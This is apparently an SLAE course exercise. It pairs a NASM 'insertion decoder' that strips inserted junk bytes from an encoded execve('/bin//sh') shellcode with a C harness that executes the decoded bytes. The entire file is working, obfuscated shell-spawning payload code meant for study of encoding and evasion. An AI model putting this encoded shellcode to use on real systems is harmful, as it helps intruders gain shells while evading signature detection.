/*
; Filename: insertion-decoder.nasm
; Author:  H4554n AlMusajjen
; Website:  https://h4554nalmusajjen.wordpress.com/
;SLAE - 1057
;encoding shellcode after pasting it in Encoder.py:
;python Encoder.py
;the code shown below the decoder

global _start			

section .text
_start:

	jmp short call_shellcode

decoder:
	pop esi
	lea edi, [esi +6]
	xor eax, eax
	mov al, 6
	xor ebx, ebx

decode: 
	mov bl, byte [esi + eax]
	xor bl, 0x70
	jnz short var1
	xor ecx, ecx
	mov ecx, 6
shifting:
	mov bl, byte [esi + eax + 4]
	mov byte [edi], bl
	inc edi
	inc eax
	loop shifting
	sub ax,6	
	add ax,10
	jmp short decode	



call_shellcode:
	call decoder
	var1: db 0x31,0xc0,0x50,0x68,0x2f,0x2f,0x70,0x75,0x74,0x61,0x73,0x68,0x68,0x2f,0x62,0x69,0x70,0x75,0x74,0x61,0x6e,0x89,0xe3,0x50,0x89,0xe2,0x70,0x75,0x74,0x61,0x53,0x89,0xe1,0xb0,0x0b,0xcd,0x70,0x75,0x74,0x61,0x80
*/
#include<stdio.h>
#include<string.h>


unsigned char code[] = \
"\xeb\x2d\x5e\x8d\x7e\x06\x31\xc0\xb0\x06\x31\xdb\x8a\x1c\x06\x80\xf3\x70\x75\x20\x31\xc9\xb9\x06\x00\x00\x00\x8a\x5c\x06\x04\x88\x1f\x47\x40\xe2\xf6\x66\x83\xe8\x06\x66\x83\xc0\x0a\xeb\xdd\xe8\xce\xff\xff\xff\x31\xc0\x50\x68\x2f\x2f\x70\x75\x74\x61\x73\x68\x68\x2f\x62\x69\x70\x75\x74\x61\x6e\x89\xe3\x50\x89\xe2\x70\x75\x74\x61\x53\x89\xe1\xb0\x0b\xcd\x70\x75\x74\x61\x80\x90\x90\x90\x90\x90";
main()
{

printf("Shellcode Length:  %d\n", (int)strlen(code));

int (*ret)() = (int(*)())code;

ret();

}
